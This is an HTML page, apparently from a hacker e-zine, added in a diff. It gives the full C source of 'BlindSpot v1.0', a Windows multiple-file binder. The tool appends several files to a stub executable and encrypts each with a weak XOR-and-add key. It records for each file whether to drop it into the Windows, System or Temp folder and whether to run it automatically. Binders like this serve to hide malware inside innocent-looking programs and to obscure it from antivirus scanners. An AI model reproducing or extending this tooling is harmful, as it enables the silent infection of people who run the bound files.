@@ -1,0 +1,422 @@
+<html><head><title>EOF ISSUE #0x01</title>
+<style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head>
+<body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 10pt">
+
+<pre><hr>|| Author: s134k || <a style="text-decoration: none" href="../mainmenu/sources.htm"><span style="text-decoration: none">Back to sources</span></a> || <a style="text-decoration: none" target="_blank" href="../binsrc/s134k/BlindSpot"><span style="text-decoration: none; color: #BFBF88">View project folder</span></a> || <hr></pre>
+<pre>
+/*
+			BlindSpot v1.0
+			- Multiple file binder with a small stub.
+
+			Coded by: s134k
+*/
+
+#pragma comment(lib, &quot;COMCTL32&quot;)
+#pragma comment(lib, &quot;SHLWAPI&quot;)
+
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;commctrl.h&gt;
+#include &lt;shlwapi.h&gt;
+#include &quot;resource.h&quot;
+
+#define WIN32_LEAN_AND_MEAN
+#define BUF_SIZE 256
+
+HWND hwndList;
+HINSTANCE hInst;
+HANDLE hLoader;
+LONG run, windir, sysdir, tmpdir;
+BOOL cancel;
+int iIndex, iSelect;
+
+struct file_data {
+	char name[40];
+	unsigned long size;
+	int key;
+	short path;
+	short run;
+} *pfile_data;
+
+BOOL CALLBACK DialogProc(HWND, UINT, WPARAM, LPARAM);
+void InitList(void);
+BOOL CALLBACK AddDialogProc(HWND, UINT, WPARAM, LPARAM);
+BOOL ExtractLoader(char *);
+int WriteFiles(int);
+void RandCryptKey(char *);
+void EncryptRecord(char *, unsigned long, char *);
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
+{
+	INITCOMMONCONTROLSEX icc;
+
+	icc.dwICC = ICC_LISTVIEW_CLASSES;
+	icc.dwSize = sizeof(INITCOMMONCONTROLSEX);
+
+	InitCommonControlsEx(&amp;icc);
+
+	hInst = hInstance;
+
+	return DialogBox(hInstance, MAKEINTRESOURCE(IDD_DIALOG), NULL, DialogProc);
+}
+
+BOOL CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
+{
+	LPNMHDR lpnmhdr;
+	LPNMITEMACTIVATE lpnmitem;
+	LVITEM lvItem;
+	LVHITTESTINFO lvHti;
+	HMENU hMenu;
+	POINT pt;
+	OPENFILENAME ofn;
+	char szFile[MAX_PATH], szSize[15], *szDir = &quot;&quot;, szBound[_MAX_FNAME] = &quot;bound&quot;;
+	HANDLE hFile;
+	DWORD dwSize;
+
+	switch(uMsg) {
+	case WM_INITDIALOG:
+		SendMessage(hwndDlg, WM_SETICON, (WPARAM)1, (LPARAM)LoadIcon(hInst, MAKEINTRESOURCE(IDI_ICON)));
+
+		hwndList = GetDlgItem(hwndDlg, IDC_LIST);
+
+		ListView_SetExtendedListViewStyle(hwndList, LVS_EX_FULLROWSELECT | LVS_EX_HEADERDRAGDROP | LVS_EX_GRIDLINES);
+		InitList();
+
+		return TRUE;
+	case WM_NOTIFY:
+		lpnmhdr = (LPNMHDR)lParam;
+		if(lpnmhdr-&gt;hwndFrom == hwndList) {
+			if(lpnmhdr-&gt;code == NM_RCLICK) {
+				lpnmitem = (LPNMITEMACTIVATE)lParam;
+				hMenu = CreatePopupMenu();
+
+				ZeroMemory(&amp;lvHti, sizeof(LVHITTESTINFO));
+
+				lvHti.pt = lpnmitem-&gt;ptAction;
+				iSelect = ListView_HitTest(hwndList, &amp;lvHti);
+
+				if(lvHti.flags &amp; LVHT_ONITEM) {
+					AppendMenu(hMenu, MF_GRAYED | MF_STRING, IDM_ADD, &quot;Add&quot;);
+					AppendMenu(hMenu, MF_STRING, IDM_REMOVE, &quot;Remove&quot;);
+				}
+				else {
+					AppendMenu(hMenu, MF_STRING, IDM_ADD, &quot;Add&quot;);
+					AppendMenu(hMenu, MF_GRAYED | MF_STRING, IDM_REMOVE, &quot;Remove&quot;);
+				}
+
+				AppendMenu(hMenu, MF_SEPARATOR, 0, NULL);
+
+				if(iIndex &lt; 2)
+					AppendMenu(hMenu, MF_GRAYED | MF_STRING, IDM_BIND, &quot;Bind&quot;);
+				else
+					AppendMenu(hMenu, MF_STRING, IDM_BIND, &quot;Bind&quot;);
+
+				GetCursorPos(&amp;pt);
+				TrackPopupMenu(hMenu, TPM_LEFTALIGN, pt.x, pt.y, 0, hwndDlg, 0);
+			}
+		}
+		DestroyMenu(hMenu);
+
+		return TRUE;
+	case WM_COMMAND:
+		switch(LOWORD(wParam)) {
+		case IDM_ADD:
+			ZeroMemory(&amp;ofn, sizeof(OPENFILENAME));
+			ZeroMemory(szFile, sizeof szFile);
+			ZeroMemory(szDir, sizeof szDir);
+
+			ofn.lStructSize = sizeof(OPENFILENAME);
+			ofn.hwndOwner = hwndDlg;
+			ofn.lpstrFilter = &quot;All Files (*.*)\0*.*\0&quot;;
+			ofn.lpstrFile = szFile;
+			ofn.nMaxFile = MAX_PATH;
+			ofn.Flags = OFN_EXPLORER | OFN_FILEMUSTEXIST | OFN_HIDEREADONLY;
+
+			if(GetOpenFileName(&amp;ofn)) {
+				cancel = FALSE;
+
+				DialogBox(hInst, MAKEINTRESOURCE(IDD_DIALOG_ADD), hwndDlg, AddDialogProc);
+
+				if(!cancel) {
+					lvItem.mask = LVIF_TEXT;
+					lvItem.cchTextMax = MAX_PATH;
+
+					lvItem.iItem = iIndex;
+					lvItem.iSubItem = 0;
+					lvItem.pszText = szFile;
+
+					ListView_InsertItem(hwndList, &amp;lvItem);
+
+					hFile = CreateFile(szFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+					if(hFile == INVALID_HANDLE_VALUE)
+						return FALSE;
+					
+					dwSize = GetFileSize(hFile, NULL);
+
+					CloseHandle(hFile);
+					wsprintf(szSize, &quot;%d KB&quot;, dwSize / 1024);
+
+					lvItem.iItem = iIndex;
+					lvItem.iSubItem = 1;
+					lvItem.pszText = szSize;
+
+					ListView_SetItem(hwndList, &amp;lvItem);
+
+					lvItem.iItem = iIndex;
+					lvItem.iSubItem = 2;
+
+					if(windir == BST_CHECKED)
+						szDir = &quot;Windows&quot;;
+					else if(sysdir == BST_CHECKED)
+						szDir = &quot;System&quot;;
+					else
+						szDir = &quot;Temporary&quot;;
+
+					lvItem.pszText = szDir;
+
+					ListView_SetItem(hwndList, &amp;lvItem);
+
+					lvItem.iItem = iIndex;
+					lvItem.iSubItem = 3;
+				
+					if(run == BST_CHECKED)
+						lvItem.pszText = &quot;Yes&quot;;
+					else
+						lvItem.pszText = &quot;No&quot;;
+
+					ListView_SetItem(hwndList, &amp;lvItem);
+
+					iIndex++;
+				}
+			}
+
+			return TRUE;
+		case IDM_REMOVE:
+			ListView_DeleteItem(hwndList, iSelect);
+
+			iIndex--;
+
+			return TRUE;
+		case IDM_BIND:
+			ZeroMemory(&amp;ofn, sizeof(OPENFILENAME));
+
+			ofn.lStructSize = sizeof(OPENFILENAME);
+			ofn.hwndOwner = hwndDlg;
+			ofn.lpstrFilter = &quot;Application (*.exe)\0*.exe\0&quot;;
+			ofn.lpstrFile = szBound;
+			ofn.lpstrDefExt = &quot;exe&quot;;
+			ofn.nMaxFile = MAX_PATH;
+			ofn.Flags = OFN_EXPLORER | OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT;
+
+			if(GetSaveFileName(&amp;ofn)) {
+				if(!ExtractLoader(szBound))
+					return FALSE;
+
+				if(!WriteFiles(iIndex)) {
+					MessageBox(hwndDlg, &quot;Error writing files.&quot;, NULL, MB_OK);
+
+					CloseHandle(hLoader);
+
+					return FALSE;
+				}
+			}
+
+			return TRUE;
+		}
+	case WM_CLOSE:
+		EndDialog(hwndDlg, 0);
+
+		return TRUE;
+	}
+
+	return FALSE;
+}
+
+void InitList(void)
+{
+	LVCOLUMN lvCol;
+	char *szColumn[] = {&quot;File&quot;, &quot;Size&quot;, &quot;Installation Directory&quot;, &quot;Run&quot;};
+	int i, width[] = {220, 55, 160, 35};
+
+	ZeroMemory(&amp;lvCol, sizeof(LVCOLUMN));
+
+	lvCol.mask = LVCF_TEXT | LVCF_SUBITEM | LVCF_WIDTH | LVCF_FMT;
+	lvCol.fmt = LVCFMT_LEFT;
+
+	for(i = 0; i &lt; 4; i++) {
+		lvCol.iSubItem = i;
+		lvCol.cx = width[i];
+		lvCol.pszText = szColumn[i];
+
+		ListView_InsertColumn(hwndList, i, &amp;lvCol);
+	}
+}
+
+BOOL CALLBACK AddDialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
+{
+	switch(uMsg) {
+	case WM_COMMAND:
+		switch(LOWORD(wParam)) {
+		case IDOK:
+			run = SendDlgItemMessage(hwndDlg, IDC_CHECK_RUN, BM_GETCHECK, wParam, lParam);
+
+			windir = SendDlgItemMessage(hwndDlg, IDC_RADIO_WINDIR, BM_GETCHECK, wParam, lParam);
+			sysdir = SendDlgItemMessage(hwndDlg, IDC_RADIO_SYSDIR, BM_GETCHECK, wParam, lParam);
+			tmpdir = SendDlgItemMessage(hwndDlg, IDC_RADIO_TMPDIR, BM_GETCHECK, wParam, lParam);
+
+			if(windir != BST_CHECKED &amp;&amp; sysdir != BST_CHECKED &amp;&amp; tmpdir != BST_CHECKED)
+				MessageBox(hwndDlg, &quot;You have not selected an installation directory.&quot;, NULL, MB_ICONERROR | MB_OK);
+			else
+				EndDialog(hwndDlg, 0);
+
+			return TRUE;
+		case IDCANCEL:
+			cancel = TRUE;
+
+			EndDialog(hwndDlg, 0);
+
+			return TRUE;
+		}
+		break;
+		case WM_CLOSE:
+			cancel = TRUE;
+
+			EndDialog(hwndDlg, 0);
+
+			return TRUE;
+	}
+
+	return FALSE;
+}
+
+BOOL ExtractLoader(char *szLoc)
+{
+	HRSRC rc;
+	HGLOBAL hGlobal;
+	HMODULE hThisProc;
+	DWORD dwSize, dwBytesWritten;
+	unsigned char *lpszData;
+
+	hThisProc = GetModuleHandle(NULL);
+	rc = FindResource(hThisProc, MAKEINTRESOURCE(IDR_RT_EXE), &quot;RT_EXE&quot;);
+
+	if(hGlobal = LoadResource(hThisProc, rc)) {
+		lpszData = (unsigned char *)LockResource(hGlobal);
+		dwSize = SizeofResource(hThisProc, rc);
+		hLoader = CreateFile(szLoc, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+		if(hLoader == INVALID_HANDLE_VALUE)
+			return FALSE;
+		else
+			WriteFile(hLoader, lpszData, dwSize, &amp;dwBytesWritten, NULL);
+	}
+
+	if(dwBytesWritten != dwSize) {
+		MessageBox(NULL, &quot;Error writing stub file.&quot;, NULL, MB_ICONERROR | MB_OK);
+
+		return FALSE;
+	}
+	else
+		return TRUE;
+}
+
+int WriteFiles(int nFileNum)
+{
+	int i;
+	HANDLE hFile;
+	DWORD dwStart, dwBytesWritten, dwBytesRead, dwSize;
+	char szPath[MAX_PATH], szDir[10], szExec[4], szKey[5], buf[BUF_SIZE], done[40];
+	struct file_data fd;
+
+	pfile_data = &amp;fd;
+	dwStart = GetTickCount();
+
+	srand(dwStart);
+
+	for(i = 0; i &lt; nFileNum; i++) {
+		ZeroMemory(&amp;fd, sizeof fd);
+
+		ListView_GetItemText(hwndList, i, 0, szPath, MAX_PATH);
+
+		hFile = CreateFile(szPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+		if(hFile == INVALID_HANDLE_VALUE)
+			return 0;
+
+		dwSize = GetFileSize(hFile, NULL);
+		pfile_data-&gt;size = dwSize;
+
+		strcpy(pfile_data-&gt;name, PathFindFileName(szPath));
+
+		ListView_GetItemText(hwndList, i, 2, szDir, sizeof szDir);
+
+		if(!strcmp(szDir, &quot;System&quot;))
+			pfile_data-&gt;path = 1;
+		else if(!strcmp(szDir, &quot;Temporary&quot;))
+			pfile_data-&gt;path = 2;
+		else
+			pfile_data-&gt;path = 3;
+
+		ListView_GetItemText(hwndList, i, 3, szExec, sizeof szExec);
+
+		pfile_data-&gt;run = strcmp(szExec, &quot;Yes&quot;) == 0 ? 1 : 0;
+
+		RandCryptKey(szKey);
+		pfile_data-&gt;key = atoi(szKey);
+
+		SetFilePointer(hLoader, 0, NULL, FILE_END);
+		WriteFile(hLoader, pfile_data, sizeof fd, &amp;dwBytesWritten, NULL);
+
+		while(ReadFile(hFile, buf, BUF_SIZE, &amp;dwBytesRead, NULL) &amp;&amp; dwBytesRead) {
+			EncryptRecord(buf, dwBytesRead, szKey);
+			WriteFile(hLoader, buf, dwBytesRead, &amp;dwBytesWritten, NULL);
+			if(dwBytesWritten != dwBytesRead)
+				return 0;
+		}
+
+		CloseHandle(hFile);
+	}
+
+	if(i == nFileNum) {
+		wsprintf(done, &quot;%d Files bound in %d second(s).&quot;, nFileNum, (GetTickCount() - dwStart) / 1000);
+
+		MessageBox(NULL, done, &quot;Finished.&quot;, MB_OK);
+	}
+	else
+		return 0;
+
+	CloseHandle(hLoader);
+	
+	return i;
+}
+
+void RandCryptKey(char *szIn)
+{
+	int i;
+
+	do i = rand();
+	while(i &lt; 1000 || i &gt; 10000);
+
+	wsprintf(szIn, &quot;%d&quot;, i);
+}
+
+void EncryptRecord(char *szRec, unsigned long nLen, char *szKey)
+{
+	unsigned long i;
+	char *p;
+
+	p = szKey;
+
+	for(i = 0; i &lt; nLen; i++) {
+		if(!(*p))
+			p = szKey;
+
+		*szRec ^= *p;
+		*szRec += *p;
+
+		szRec++;
+		p++;
+	}
+}    
+</pre></body></html>
